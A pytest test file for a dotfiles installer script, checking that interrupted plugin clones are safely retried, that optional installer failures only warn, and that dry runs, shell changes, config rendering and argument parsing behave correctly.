    def _mark_omz_installed(self, home):
        # The zsh plugin clones sit behind install_oh_my_zsh's own entry-point
        # guard; short-circuit the download the way a machine that already has
        # Oh My Zsh would, so these tests cover the plugin clones only.
        omz = home / ".oh-my-zsh"
        omz.mkdir(parents=True, exist_ok=True)
        (omz / "oh-my-zsh.sh").write_text("# stub entry point\n", encoding="utf-8")

    def _interrupted_clone(self, path: Path) -> Path:
        """The exact on-disk state a SIGKILLed `git clone` leaves behind."""
        git_dir = path / ".git"
        (git_dir / "objects").mkdir(parents=True)
        (git_dir / "config").write_text("[core]\n", encoding="utf-8")
        assert [e.name for e in path.iterdir()] == [".git"]
        return path

    def _healthy_checkout(self, path: Path, entry_point: str) -> Path:
        (path / ".git" / "objects").mkdir(parents=True)
        (path / entry_point).write_text("# plugin\n", encoding="utf-8")
        (path / "README.md").write_text("# upstream\n", encoding="utf-8")
        return path

    def _clone_calls(self, shell_env):
        return [c for c in shell_env.calls if c.startswith("git clone")]

    # --- the wedge itself ---------------------------------------------------

    def test_interrupted_tpm_clone_is_retried_instead_of_reported_installed(
        self, shell_env
    ):
        self._stub_git_clone(shell_env)
        home = shell_env.home
        (home / self.TPM).mkdir(parents=True)
        self._interrupted_clone(home / self.TPM)

        res = run_sourced("install_tmux_plugins", shell_env.env)

        assert res.returncode == 0, res.stdout + res.stderr
        assert "tpm already installed" not in res.stdout, (
            "a directory holding only .git was read as an installed tpm"
        )
        assert (home / self.TPM / "tpm").is_file(), (
            "tpm was never re-cloned: .tmux.conf's `run '~/.tmux/plugins/tpm/tpm'` "
            "stays broken on every tmux start until the directory is removed by hand"
        )
        assert len(self._clone_calls(shell_env)) == 1

    @pytest.mark.parametrize(
        "plugin",
        ["zsh-autosuggestions", "zsh-syntax-highlighting"],
    )
    def test_interrupted_zsh_plugin_clone_is_retried(self, shell_env, plugin):
        self._stub_git_clone(shell_env)
        home = shell_env.home
        self._mark_omz_installed(home)
        target = home / ".oh-my-zsh/custom/plugins" / plugin
        target.mkdir(parents=True)
        self._interrupted_clone(target)

        res = run_sourced("install_oh_my_zsh", shell_env.env)

        assert res.returncode == 0, res.stdout + res.stderr
        assert (target / f"{plugin}.zsh").is_file(), (
            f"{plugin} was never re-cloned: every interactive shell keeps "
            "starting without it"
        )

    def test_repaired_clone_is_not_repeated_on_the_next_run(self, shell_env):
        # The repair must land in a state the guard then recognises, or the
        # fix trades a permanent skip for a permanent re-clone.
        self._stub_git_clone(shell_env)
        home = shell_env.home
        (home / self.TPM).mkdir(parents=True)
        self._interrupted_clone(home / self.TPM)

        first = run_sourced("install_tmux_plugins", shell_env.env)
        assert first.returncode == 0, first.stdout + first.stderr
        assert len(self._clone_calls(shell_env)) == 1

        second = run_sourced("install_tmux_plugins", shell_env.env)
        assert second.returncode == 0, second.stdout + second.stderr
        assert "tpm already installed" in second.stdout
        assert len(self._clone_calls(shell_env)) == 1

    def test_empty_leftover_directory_needs_no_removal_to_be_cloned_into(
        self, shell_env
    ):
        # `git clone` accepts an existing EMPTY directory, so this case must
        # reach the clone without deleting anything -- it is also the state a
        # repair leaves behind when the retry itself then fails.
        self._stub_git_clone(shell_env)
        home = shell_env.home
        (home / self.TPM).mkdir(parents=True)

        res = run_sourced("install_tmux_plugins", shell_env.env)

        assert res.returncode == 0, res.stdout + res.stderr
        assert (home / self.TPM / "tpm").is_file()

    # --- what the repair must never touch -----------------------------------

    def test_healthy_tpm_checkout_is_skipped_and_left_intact(self, shell_env):
        self._stub_git_clone(shell_env)
        home = shell_env.home
        (home / self.TPM).mkdir(parents=True)
        self._healthy_checkout(home / self.TPM, "tpm")

        res = run_sourced("install_tmux_plugins", shell_env.env)

        assert res.returncode == 0, res.stdout + res.stderr
        assert "tpm already installed" in res.stdout
        assert self._clone_calls(shell_env) == []
        assert (home / self.TPM / ".git").is_dir(), "a healthy checkout was gutted"
        assert (home / self.TPM / "README.md").is_file()

    @pytest.mark.parametrize(
        "plugin",
        ["zsh-autosuggestions", "zsh-syntax-highlighting"],
    )
    def test_healthy_zsh_plugin_checkout_is_skipped_and_left_intact(
        self, shell_env, plugin
    ):
        self._stub_git_clone(shell_env)
        home = shell_env.home
        self._mark_omz_installed(home)
        target = home / ".oh-my-zsh/custom/plugins" / plugin
        target.mkdir(parents=True)
        self._healthy_checkout(target, f"{plugin}.zsh")

        res = run_sourced("install_oh_my_zsh", shell_env.env)

        assert res.returncode == 0, res.stdout + res.stderr
        # Only this plugin's clone must be skipped -- the sibling plugin is
        # genuinely absent here and is expected to be cloned.
        assert [c for c in self._clone_calls(shell_env) if plugin in c] == []
        assert (target / ".git").is_dir()
        assert (target / "README.md").is_file()

    def test_populated_but_broken_directory_is_reported_never_deleted(self, shell_env):
        """Files under the target mean it is not an interrupted clone.

        A checkout that lost only its entry point, or a directory the user
        put something of their own into, is out of scope for an automatic
        repair -- 5236098 took the same stance on an already-populated $ZSH.
        It must still be SAID out loud, because silence is the actual bug
        being fixed here.
        """
        self._stub_git_clone(shell_env)
        home = shell_env.home
        (home / self.TPM).mkdir(parents=True)
        self._interrupted_clone(home / self.TPM)
        mine = home / self.TPM / "notes.txt"
        mine.write_text("mine\n", encoding="utf-8")

        res = run_sourced("install_tmux_plugins", shell_env.env)

        assert res.returncode == 0, res.stdout + res.stderr
        assert mine.read_text(encoding="utf-8") == "mine\n"
        assert (home / self.TPM / ".git").is_dir()
        assert "[WARNING]" in res.stdout
        assert self._clone_calls(shell_env) == []

    def test_symlinked_target_is_not_followed(self, shell_env, tmp_path):
        # `-d` reports true THROUGH a symlink, so an unguarded repair would
        # empty whatever is on the far end -- a path the user chose, outside
        # the plugin directory entirely.
        self._stub_git_clone(shell_env)
        home = shell_env.home
        elsewhere = tmp_path / "my-own-tpm"
        elsewhere.mkdir()
        self._interrupted_clone(elsewhere)
        (home / ".tmux/plugins").mkdir(parents=True)
        (home / self.TPM).symlink_to(elsewhere)

        res = run_sourced("install_tmux_plugins", shell_env.env)

        assert res.returncode == 0, res.stdout + res.stderr
        assert (elsewhere / ".git").is_dir(), "the repair reached through a symlink"
        assert (home / self.TPM).is_symlink()
        assert "[WARNING]" in res.stdout
        assert self._clone_calls(shell_env) == []

    def test_a_target_outside_home_is_refused(self, shell_env, tmp_path):
        # Containment. Every caller passes a literal plugin path under $HOME;
        # the helper asserts that rather than trusting it, so no future caller
        # can aim the `rm -rf` at anything outside those directories. Called
        # directly because no caller can reach this branch today -- which is
        # the point of pinning it now.
        outside = tmp_path / "outside-home"
        outside.mkdir()
        self._interrupted_clone(outside)

        res = run_sourced(
            f'rc=0; reclaim_aborted_clone "{outside}" demo || rc=$?; echo "RC=$rc"',
            shell_env.env,
        )

        assert res.returncode == 0, res.stdout + res.stderr
        assert "RC=1" in res.stdout
        assert "[WARNING]" in res.stdout
        assert (outside / ".git").is_dir(), "the rm reached outside $HOME"

    def test_dry_run_removes_nothing_and_clones_nothing(self, shell_env):
        # main() never reaches install_tmux_plugins in dry-run today, but an
        # `rm -rf` that a single refactor could expose to a preview run is
        # worth pinning down rather than arguing about.
        self._stub_git_clone(shell_env)
        home = shell_env.home
        (home / self.TPM).mkdir(parents=True)
        self._interrupted_clone(home / self.TPM)

        res = run_sourced("DRY_RUN=1 install_tmux_plugins", shell_env.env)

        assert res.returncode == 0, res.stdout + res.stderr
        assert (home / self.TPM / ".git").is_dir()
        assert self._clone_calls(shell_env) == []


class TestRegisterClaudeMcpServers:
    def test_gemini_consultant_uses_resolved_python3(self, shell_env):
        # `claude mcp get NAME` must fail so add_mcp proceeds to register.
        shell_env.stub("claude", body='[ "$1" = "mcp" ] && [ "$2" = "get" ] && exit 1')
        shell_env.stub("python3")

        res = run_sourced("register_claude_mcp_servers", shell_env.env)
        assert res.returncode == 0, res.stderr

        add_calls = [c for c in shell_env.calls if c.startswith("claude mcp add")]
        gemini_calls = [c for c in add_calls if "gemini-consultant" in c]
        assert len(gemini_calls) == 1, add_calls

        python3_path = str(shell_env.stub_bin / "python3")
        assert f"-- {python3_path} " in gemini_calls[0]


class TestOptionalInstallerFailures:
    """A transient brew/network/apt failure in one optional installer must
    warn and move on -- never abort the whole installer via `set -e`."""

    def test_wezterm_brew_failure_does_not_abort_script_macos(self, shell_env):
        shell_env.stub("brew", exit_code=1)
        res = run_sourced(
            'OS=macos install_wezterm; echo "AFTER_WEZTERM"',
            shell_env.env,
        )
        assert res.returncode == 0, res.stderr
        assert "AFTER_WEZTERM" in res.stdout
        assert "[WARNING]" in res.stdout

    def test_fonts_brew_failure_does_not_abort_script_macos(self, shell_env):
        shell_env.stub("brew", exit_code=1)
        res = run_sourced(
            'OS=macos install_fonts; echo "AFTER_FONTS"',
            shell_env.env,
        )
        assert res.returncode == 0, res.stderr
        assert "AFTER_FONTS" in res.stdout
        assert "[WARNING]" in res.stdout

    def test_wezterm_curl_failure_does_not_abort_script(self, shell_env):
        shell_env.stub("curl", exit_code=1)
        shell_env.stub("sudo")
        res = run_sourced(
            "command_exists() { return 1; }; "
            'OS=ubuntu install_wezterm; echo "AFTER_WEZTERM"',
            shell_env.env,
        )
        assert res.returncode == 0, res.stderr
        assert "AFTER_WEZTERM" in res.stdout
        assert "[WARNING]" in res.stdout

    def test_gh_curl_failure_does_not_abort_script(self, shell_env):
        shell_env.stub("curl", exit_code=1)
        shell_env.stub("sudo")
        res = run_sourced(
            'command_exists() { return 1; }; OS=ubuntu install_gh; echo "AFTER_GH"',
            shell_env.env,
        )
        assert res.returncode == 0, res.stderr
        assert "AFTER_GH" in res.stdout
        assert "[WARNING]" in res.stdout

    def test_fonts_apt_failure_does_not_abort_script(self, shell_env):
        shell_env.stub("sudo", exit_code=1)
        res = run_sourced(
            'OS=ubuntu install_fonts; echo "AFTER_FONTS"',
            shell_env.env,
        )
        assert res.returncode == 0, res.stderr
        assert "AFTER_FONTS" in res.stdout
        assert "[WARNING]" in res.stdout

    def test_oh_my_zsh_download_failure_does_not_abort_script(self, shell_env):
        # The Oh My Zsh installer download was the one optional installer whose
        # fetch_and_run was unguarded. Under `set -eo pipefail` a transient
        # network failure there aborted main() outright, so everything after it
        # (vim-plug, tmux plugins, Neovim setup, AI tools, MCP registration, the
        # theme symlink and the shell change) silently never ran.
        shell_env.stub("git")
        res = run_sourced(
            'fetch_and_run() { return 1; }; install_oh_my_zsh; echo "AFTER_OMZ"',
            shell_env.env,
        )
        assert res.returncode == 0, res.stderr
        assert "AFTER_OMZ" in res.stdout
        assert "[WARNING]" in res.stdout

    def test_oh_my_zsh_download_failure_does_not_claim_success(self, shell_env):
        shell_env.stub("git")
        res = run_sourced(
            "fetch_and_run() { return 1; }; install_oh_my_zsh",
            shell_env.env,
        )
        assert "Oh My Zsh installed" not in res.stdout


class TestAptAliasSymlinks:
    """Debian ships bat/fd as batcat/fdfind, so install_apt_packages drops
    PATH-visible aliases into ~/.local/bin. Those two `ln -sf` calls are the
    only links in the script that skip create_symlinks' backup step --
    link_debian_alias hand-rolls its own guard instead of calling
    `backup_if_real` (these are generated aliases, not dotfiles worth backing
    up into $backup_dir). `backup_if_real` used to be nested inside
    create_symlinks and out of scope here; it has since been hoisted to top
    level, but link_debian_alias still does not call it. Before its own guard
    was added, a real user binary at that path was destroyed with no backup
    and no warning."""

    def _prepare(self, shell_env):
        shell_env.stub("batcat")
        shell_env.stub("fdfind")
        local_bin = shell_env.home / ".local" / "bin"
        local_bin.mkdir(parents=True, exist_ok=True)
        return local_bin

    def test_real_user_binary_is_never_replaced(self, shell_env):
        local_bin = self._prepare(shell_env)
        mine = local_bin / "fd"
        mine.write_text("#!/bin/sh\necho MINE\n", encoding="utf-8")

        res = run_sourced("install_apt_packages", shell_env.env)

        assert res.returncode == 0, res.stderr
        assert not mine.is_symlink(), "a real user binary must not become a symlink"
        assert "MINE" in mine.read_text(encoding="utf-8")
        assert "[WARNING]" in res.stdout

    def test_alias_is_created_when_nothing_is_in_the_way(self, shell_env):
        local_bin = self._prepare(shell_env)

        res = run_sourced("install_apt_packages", shell_env.env)

        assert res.returncode == 0, res.stderr
        for name in ("bat", "fd"):
            assert (local_bin / name).is_symlink(), f"{name} alias was not created"

    def test_existing_alias_symlink_is_refreshed(self, shell_env):
        # A symlink is ours to replace (same rule backup_if_real applies):
        # a stale target must be re-pointed, not left dangling.
        local_bin = self._prepare(shell_env)
        stale = local_bin / "fd"
        stale.symlink_to("/nonexistent/old-fdfind")

        res = run_sourced("install_apt_packages", shell_env.env)

        assert res.returncode == 0, res.stderr
        assert stale.is_symlink()
        assert stale.resolve().name == "fdfind"


class TestInstallHomebrew:
    """The Homebrew bootstrap was the last unguarded fetch_and_run in the file.

    Under `set -eo pipefail` a bare `fetch_and_run <homebrew installer>` took
    the whole run down the moment the download failed: main() entered
    install_os_packages and never came back, so every later step (WezTerm,
    fonts, Node, gh, pyenv, uv, glow, Docker, MCP, linters, Oh My Zsh,
    vim-plug, tmux plugins, AI tools, the shell change) was silently skipped
    with no completion message. The arm is macOS-only, so the ubuntu-latest
    CI never executed it.
    """

    # conftest's shell_env installs a backstop `brew` stub, so
    # `command_exists brew` is TRUE by default and a test premised on brew
    # being absent would take the already-installed branch and pass
    # vacuously. Shadow the probe for brew only, leaving the real lookup in
    # place for everything else.
    _BREW_ABSENT = (
        'command_exists() { case "$1" in brew) return 1 ;; '
        '*) command -v "$1" >/dev/null 2>&1 ;; esac; }; '
    )

    def test_bootstrap_failure_returns_nonzero_and_warns(self, shell_env):
        # `if` rather than a bare call: after the fix the non-zero return is
        # the contract, and a bare call would trip the harness's own `set -e`
        # before the assertions could read the status.
        res = run_sourced(
            self._BREW_ABSENT + "fetch_and_run() { return 1; }; "
            'if install_homebrew; then echo "RC=0"; else echo "RC=$?"; fi',
            shell_env.env,
        )
        assert res.returncode == 0, res.stderr
        # Proves the bootstrap branch was actually entered, not the
        # already-installed one.
        assert "Installing Homebrew..." in res.stdout
        assert "RC=1" in res.stdout
        assert "skipping Homebrew packages" in res.stdout

    def test_bootstrap_failure_does_not_claim_success(self, shell_env):
        res = run_sourced(
            self._BREW_ABSENT + "fetch_and_run() { return 1; }; "
            "install_homebrew || true",
            shell_env.env,
        )
        assert "Homebrew installed" not in res.stdout

    def test_already_installed_still_succeeds_quietly(self, shell_env):
        # shell_env's backstop brew stub IS the "already present" condition;
        # the guard must not cost this path its success return or its message.
        res = run_sourced('install_homebrew; echo "AFTER_HOMEBREW"', shell_env.env)
        assert res.returncode == 0, res.stderr
        assert "Homebrew already installed" in res.stdout
        assert "AFTER_HOMEBREW" in res.stdout
        assert "[WARNING]" not in res.stdout


class TestInstallOsPackages:
    """OS-specific package installation, extracted from main()'s inline
    case so the dispatch is unit-testable on its own. A bash `case` with no
    matching arm is a silent no-op: a non-Debian Linux (OS="linux", set by
    detect_os when /etc/debian_version is absent) used to fall through with
    no warning and no packages installed."""

    def test_non_debian_linux_warns_instead_of_silently_skipping(self, shell_env):
        res = run_sourced(
            'OS=linux install_os_packages; echo "AFTER_OS_PACKAGES"', shell_env.env
        )
        assert res.returncode == 0, res.stderr
        assert "AFTER_OS_PACKAGES" in res.stdout
        assert "[WARNING]" in res.stdout

    def test_ubuntu_still_dispatches_to_apt(self, shell_env):
        res = run_sourced(
            "install_apt_packages() { echo CALLED_APT; }; "
            "OS=ubuntu install_os_packages",
            shell_env.env,
        )
        assert res.returncode == 0, res.stderr
        assert "CALLED_APT" in res.stdout

    def test_macos_still_dispatches_to_homebrew(self, shell_env):
        res = run_sourced(
            "install_homebrew() { echo CALLED_HOMEBREW; }; "
            "install_brew_packages() { echo CALLED_BREW_PACKAGES; }; "
            "OS=macos install_os_packages",
            shell_env.env,
        )
        assert res.returncode == 0, res.stderr
        assert "CALLED_HOMEBREW" in res.stdout
        assert "CALLED_BREW_PACKAGES" in res.stdout

    def test_macos_skips_brew_packages_when_homebrew_bootstrap_fails(self, shell_env):
        # install_brew_packages needs `brew` on PATH, so running it after a
        # failed bootstrap would only produce a second wave of failures. The
        # `if` form is also what keeps `set -e` from aborting this arm on
        # install_homebrew's non-zero return.
        res = run_sourced(
            "install_homebrew() { return 1; }; "
            "install_brew_packages() { echo CALLED_BREW_PACKAGES; }; "
            'OS=macos install_os_packages; echo "AFTER_OS_PACKAGES"',
            shell_env.env,
        )
        assert res.returncode == 0, res.stderr
        assert "AFTER_OS_PACKAGES" in res.stdout
        assert "CALLED_BREW_PACKAGES" not in res.stdout

    def test_windows_still_warns(self, shell_env):
        res = run_sourced("OS=windows install_os_packages", shell_env.env)
        assert res.returncode == 0, res.stderr
        assert "[WARNING]" in res.stdout


class TestInstallNodejs:
    """npm can legitimately be absent by the time the prefix is configured:
    the installs above are best-effort (brew/NodeSource failures only warn)
    and the windows branch never installs node at all. A bare `npm config
    set` then exits 127 and `set -e` takes the whole run down with it,
    skipping every step after install_nodejs."""

    @staticmethod
    def _env_without_node(shell_env) -> dict:
        """shell_env's PATH keeps the real one appended, so a host npm would
        satisfy `npm config set` and hide the very abort under test. Drop
        every directory that provides node or npm instead of stubbing them:
        absence is the condition, and a stub would only prove it exists."""
        env = dict(shell_env.env)
        while True:
            found = shutil.which("npm", path=env["PATH"]) or shutil.which(
                "node", path=env["PATH"]
            )
            if not found:
                return env
            drop = str(Path(found).parent)
            env["PATH"] = ":".join(p for p in env["PATH"].split(":") if p != drop)

    def test_missing_npm_does_not_abort_script(self, shell_env):
        # windows never installs node, so this is the ordinary path there.
        env = self._env_without_node(shell_env)
        res = run_sourced('OS=windows install_nodejs; echo "AFTER_NODEJS"', env)
        assert res.returncode == 0, res.stderr
        assert "AFTER_NODEJS" in res.stdout
        assert "[WARNING]" in res.stdout

    def test_missing_npm_after_failed_install_does_not_abort_script(self, shell_env):
        shell_env.stub("brew", exit_code=1)
        env = self._env_without_node(shell_env)
        res = run_sourced('OS=macos install_nodejs; echo "AFTER_NODEJS"', env)
        assert res.returncode == 0, res.stderr
        assert "AFTER_NODEJS" in res.stdout
        assert "[WARNING]" in res.stdout

    def test_configures_prefix_when_npm_present(self, shell_env):
        # The guard must not cost the happy path its prefix.
        shell_env.stub("node")
        shell_env.stub("npm")
        res = run_sourced('OS=macos install_nodejs; echo "AFTER_NODEJS"', shell_env.env)
        assert res.returncode == 0, res.stderr
        assert "AFTER_NODEJS" in res.stdout
        expected = f"npm config set prefix {shell_env.home}/.npm-global"
        assert expected in shell_env.calls
        assert (shell_env.home / ".npm-global").is_dir()


# go install places binaries under $HOME/go/bin (fixture $HOME, not this
# dev machine's real one). Given "install <pkg>@version", write a fake
# executable named after the package's last path segment, mirroring what a
# real `go install .../cmd/<tool>@latest` produces.
_GO_INSTALL_STUB = r"""
if [ "$1" = "install" ]; then
  pkg="${2%@*}"
  tool="${pkg##*/}"
  mkdir -p "$HOME/go/bin"
  touch "$HOME/go/bin/$tool"
  chmod +x "$HOME/go/bin/$tool"
fi
"""


class TestGoInstallPathExport:
    """install_nodejs/install_uv export PATH right after their own install
    so the immediately-following command_exists check sees what was just
    installed. install_glow and install_linters_formatters's Ubuntu
    branches did not: `go install` places binaries under ~/go/bin, which
    is not on PATH until exported, so the following command_exists check
    (and anything later in the same run) falsely reports the tool missing."""

    def test_glow_ubuntu_go_install_path_is_exported(self, shell_env):
        # This dev machine has a real glow on PATH; it must not mask the
        # fixture's fresh "not installed yet" state.
        env = _without_commands(shell_env.env, "glow")
        shell_env.stub("go", body=_GO_INSTALL_STUB)
        res = run_sourced('OS=ubuntu install_glow; echo "AFTER_GLOW"', env)
        assert res.returncode == 0, res.stderr
        assert "AFTER_GLOW" in res.stdout
        assert "glow installed" in res.stdout

    def test_linters_formatters_ubuntu_go_installed_tools_visible_afterward(
        self, shell_env
    ):
        # Neutralize real ambient tools this dev machine happens to have so
        # the Ubuntu branch actually exercises its go-install paths instead
        # of finding them "already installed". gem and pip3 are left to a
        # command_exists override rather than a PATH strip: both also have
        # a copy under /usr/bin (Apple's system Python/Ruby), which
        # _without_commands refuses to remove since it also carries
        # touch/sudo/curl/dirname that the rest of this test still needs.
        env = _without_commands(
            shell_env.env, "staticcheck", "goimports", "npm", "pip", "php"
        )
        shell_env.stub("go", body=_GO_INSTALL_STUB)
        shell_env.stub("sudo")
        res = run_sourced(
            'command_exists() { case "$1" in gem|pip3) return 1 ;; '
            '*) command -v "$1" >/dev/null 2>&1 ;; esac; }; '
            "OS=ubuntu install_linters_formatters; "
            "command_exists staticcheck && echo STATICCHECK_ON_PATH; "
            "command_exists goimports && echo GOIMPORTS_ON_PATH",
            env,
        )
        assert res.returncode == 0, res.stdout + res.stderr
        assert "STATICCHECK_ON_PATH" in res.stdout, res.stdout
        assert "GOIMPORTS_ON_PATH" in res.stdout, res.stdout

    def test_linters_formatters_macos_go_installed_tools_visible_afterward(
        self, shell_env
    ):
        """The macOS branch has the same defect the Ubuntu one was fixed for.

        macOS gets staticcheck from brew, so only goimports arrives through
        `go install` there -- and that branch never exported ~/go/bin. The
        `command_exists goimports` guard right above the install therefore
        stayed false forever, so every re-run of install.sh fetched and
        rebuilt goimports from scratch, and nothing later in the run could
        see it either.
        """
        env = _without_commands(shell_env.env, "goimports", "npm", "pip", "php")
        shell_env.stub("go", body=_GO_INSTALL_STUB)
        shell_env.stub("brew")
        res = run_sourced(
            'command_exists() { case "$1" in gem|pip3) return 1 ;; '
            '*) command -v "$1" >/dev/null 2>&1 ;; esac; }; '
            "OS=macos install_linters_formatters; "
            "command_exists goimports && echo GOIMPORTS_ON_PATH",
            env,
        )
        assert res.returncode == 0, res.stdout + res.stderr
        assert "GOIMPORTS_ON_PATH" in res.stdout, res.stdout


class TestChangeShell:
    def test_chsh_failure_does_not_abort_script(self, shell_env):
        shell_env.stub("zsh")
        shell_env.stub("chsh", exit_code=1)
        env = dict(shell_env.env)
        env["SHELL"] = "/bin/bash"

        res = run_sourced('change_shell; echo "AFTER_CHANGE_SHELL"', env)

        assert res.returncode == 0, res.stderr
        assert "AFTER_CHANGE_SHELL" in res.stdout
        assert "chsh failed" in res.stdout

    # macOS ships /bin/zsh (Apple's default-shell zsh) alongside a homebrew
    # one, so a PATH strip can't make `zsh` genuinely unresolvable without
    # also taking /bin -- and therefore bash itself -- off PATH. Shadow the
    # two lookup mechanisms `change_shell` actually uses instead: `which`
    # (the old code's `$(which zsh)`) and `command_exists` (the new guard).
    _ZSH_ABSENT = (
        'which() { [ "$1" = "zsh" ] && return 1 || command which "$@"; }; '
        'command_exists() { [ "$1" = "zsh" ] && return 1 '
        '|| command -v "$1" >/dev/null 2>&1; }; '
    )

    def test_missing_zsh_warns_and_never_invokes_chsh(self, shell_env):
        # Without a `command_exists zsh` guard, `$(which zsh)` resolves to
        # "" when zsh isn't installed, and `[ "$SHELL" != "" ]` is true, so
        # the old code proceeded straight to `chsh -s ""`.
        shell_env.stub("chsh")
        env = dict(shell_env.env)
        env["SHELL"] = "/bin/bash"

        res = run_sourced(
            self._ZSH_ABSENT + 'change_shell; echo "AFTER_CHANGE_SHELL"', env
        )

        assert res.returncode == 0, res.stderr
        assert "AFTER_CHANGE_SHELL" in res.stdout
        assert "[WARNING]" in res.stdout
        assert not any(c.startswith("chsh") for c in shell_env.calls)

    @pytest.mark.parametrize("dry_run", ["0", "1"])
    def test_a_login_shell_that_is_another_zsh_is_already_zsh(self, shell_env, dry_run):
        """A second zsh earlier on PATH does not make the login shell "not zsh".

        macOS logs in with /bin/zsh, and install_brew_packages itself puts a
        homebrew zsh first on PATH, so `$SHELL != $(which zsh)` held on every
        run: chsh was attempted again (a password prompt), failed because
        /opt/homebrew/bin/zsh is not in /etc/shells, and printed advice to
        add it there -- for a user whose shell never needed changing.
        """
        shell_env.stub("zsh")  # which zsh -> the stub dir, not /bin/zsh
        env = {**shell_env.env, "SHELL": "/bin/zsh", "DRY_RUN": dry_run}

        res = run_sourced("change_shell", env)

        assert res.returncode == 0, res.stderr
        assert "already zsh" in res.stdout
        assert "would change" not in res.stdout
        assert not any(c.startswith("chsh") for c in shell_env.calls)

    def test_missing_zsh_warns_in_dry_run_too(self, shell_env):
        env = {**shell_env.env, "DRY_RUN": "1", "SHELL": "/bin/bash"}

        res = run_sourced(
            self._ZSH_ABSENT + 'change_shell; echo "AFTER_CHANGE_SHELL"', env
        )

        assert res.returncode == 0, res.stderr
        assert "[WARNING]" in res.stdout


class TestHooksJsonTemplate:
    def test_renders_hooks_json_with_resolved_home(self, shell_env):
        home = shell_env.home
        (home / ".oh-my-zsh").mkdir()

        res = run_sourced("create_symlinks", shell_env.env)
        assert res.returncode == 0, res.stderr

        rendered = home / ".codex/hooks.json"
        assert rendered.is_file()
        assert not rendered.is_symlink()
        assert not (home / ".codex/hooks.json.template").exists()

        content = rendered.read_text(encoding="utf-8")
        assert "__HOME__" not in content
        assert str(home) in content
        assert json.loads(content)  # must still be valid JSON
        # bash-review is launched through the fail-closed launcher (wiring
        # pinned in test_config_wiring.py). The python3-not-bare-python rule
        # (bare `python` does not exist on stock Ubuntu or Homebrew installs,
        # same rationale as the MCP registration) now lives inside the
        # launcher, exercised by test_bash_review_launcher.py; the rendered
        # config itself must still never invoke bare `python`.
        assert "bash-review-launcher.sh'" in content
        assert "python '" not in content

    def test_rerun_regenerates_hooks_json(self, shell_env):
        home = shell_env.home
        (home / ".oh-my-zsh").mkdir()

        first = run_sourced("create_symlinks", shell_env.env)
        assert first.returncode == 0, first.stderr
        second = run_sourced("create_symlinks", shell_env.env)
        assert second.returncode == 0, second.stderr

        rendered = home / ".codex/hooks.json"
        assert rendered.is_file()
        assert not rendered.is_symlink()
        assert str(home) in rendered.read_text(encoding="utf-8")


class TestHooksJsonDryRunDiff:
    """The DRY_RUN branch used to unconditionally print "would render",
    regardless of whether the rendered output actually differs from what is
    already on disk -- unlike the real branch, which already does the
    cmp -s check to skip a no-op re-render."""

    @staticmethod
    def _hooks_json_lines(stdout: str) -> list:
        return [ln for ln in stdout.splitlines() if "hooks.json" in ln]

    def test_dry_run_reports_unchanged_when_content_matches(self, shell_env):
        home = shell_env.home
        (home / ".oh-my-zsh").mkdir()

        first = run_sourced("create_symlinks", shell_env.env)
        assert first.returncode == 0, first.stderr

        env = {**shell_env.env, "DRY_RUN": "1"}
        second = run_sourced("create_symlinks", env)
        assert second.returncode == 0, second.stderr

        lines = self._hooks_json_lines(second.stdout)
        assert any("unchanged" in ln for ln in lines), second.stdout
        assert not any("would render" in ln for ln in lines), second.stdout

    def test_dry_run_reports_would_render_when_content_differs(self, shell_env):
        home = shell_env.home
        (home / ".codex").mkdir(parents=True)
        (home / ".codex/hooks.json").write_text("{}\n", encoding="utf-8")

        env = {**shell_env.env, "DRY_RUN": "1"}
        res = run_sourced("create_symlinks", env)
        assert res.returncode == 0, res.stderr

        lines = self._hooks_json_lines(res.stdout)
        assert any("would render" in ln for ln in lines), res.stdout
        assert not any("unchanged" in ln for ln in lines), res.stdout

    def test_dry_run_touches_nothing_either_way(self, shell_env):
        # The diff check itself must stay read-only: no write to HOME.
        home = shell_env.home
        (home / ".oh-my-zsh").mkdir()
        env = {**shell_env.env, "DRY_RUN": "1"}

        res = run_sourced("create_symlinks", env)
        assert res.returncode == 0, res.stderr
        assert not (home / ".codex/hooks.json").exists()


# A curl stub that "downloads" a script by writing it to curl's `-o` target.
# The written script echoes its own path ($0) and positional args ($*) so the
# tests can assert both that it ran and how fetch_and_run invoked it.
_CURL_WRITES_SCRIPT = r"""
out=""; prev=""
for a in "$@"; do
  [ "$prev" = "-o" ] && out="$a"
  prev="$a"
done
[ -n "$out" ] && printf '%s\n' 'echo "RAN tmp=$0 args=[$*]"' > "$out"
"""


class TestUsageAndArgs:
    """`--help` / `--dry-run` / bad-flag handling in main()'s arg parser.

    Parsing runs before the checkout guard so --help works anywhere, and
    before the first side effect so nothing is touched on the error paths.
    """

    def test_help_prints_usage_and_does_nothing(self, shell_env):
        res = run_sourced("main --help", shell_env.env)
        assert res.returncode == 0, res.stderr
        assert "Usage:" in res.stdout
        assert "--dry-run" in res.stdout
        # --help returns before any installation step.
        assert "Creating symbolic links" not in res.stdout
        assert list(shell_env.home.iterdir()) == []

    def test_short_help_flag(self, shell_env):
        res = run_sourced("main -h", shell_env.env)
        assert res.returncode == 0, res.stderr
        assert "Usage:" in res.stdout

    def test_unknown_option_errors_with_exit_2(self, shell_env):
        # `set -e` (from the sourced script) turns main's `return 2` into the
        # shell's exit status directly.
        res = run_sourced("main --bogus", shell_env.env)
        assert res.returncode == 2, res.stdout + res.stderr
        assert "Unknown option: --bogus" in res.stdout
        assert list(shell_env.home.iterdir()) == []

    def test_unexpected_positional_errors_with_exit_2(self, shell_env):
        res = run_sourced("main extra-arg", shell_env.env)
        assert res.returncode == 2, res.stdout + res.stderr
        assert "Unexpected argument: extra-arg" in res.stdout


class TestDryRun:
    """--dry-run must preview the destructive/user-specific work (symlinks,
    backups, rendered configs, chsh) while touching NOTHING on disk."""

    def test_create_symlinks_leaves_fresh_home_empty(self, shell_env):
        # The discriminating check: any unguarded mkdir/ln/cp/render/backup
        # would leave a trace here. HOME must be byte-for-byte untouched.
        home = shell_env.home
        env = {**shell_env.env, "DRY_RUN": "1"}
        res = run_sourced("create_symlinks", env)
        assert res.returncode == 0, res.stderr
        assert list(home.iterdir()) == [], list(home.iterdir())
        # ...and it announced the plan.
        assert "[DRY-RUN]" in res.stdout
        assert "would link" in res.stdout

    def test_create_symlinks_does_not_disturb_existing_entries(self, shell_env):
        home = shell_env.home
        (home / ".oh-my-zsh").mkdir()
        (home / ".zshrc").write_text("keep me\n", encoding="utf-8")
        before = sorted(p.name for p in home.iterdir())

        env = {**shell_env.env, "DRY_RUN": "1"}
        res = run_sourced("create_symlinks", env)
        assert res.returncode == 0, res.stderr

        assert sorted(p.name for p in home.iterdir()) == before
